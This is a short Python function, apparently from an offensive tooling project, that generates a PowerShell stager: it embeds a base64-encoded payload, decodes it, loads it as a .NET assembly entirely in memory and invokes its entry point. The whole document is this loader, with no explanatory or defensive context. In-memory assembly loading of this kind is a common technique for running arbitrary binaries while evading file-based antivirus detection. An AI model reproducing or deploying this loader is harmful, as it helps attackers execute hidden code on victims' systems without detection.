def generate(encoded_payload):
    ps_template = f"""
$payload = "{encoded_payload}"
$bytes = [System.Convert]::FromBase64String($payload)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, (, [string[]] @()))
"""
    return ps_template

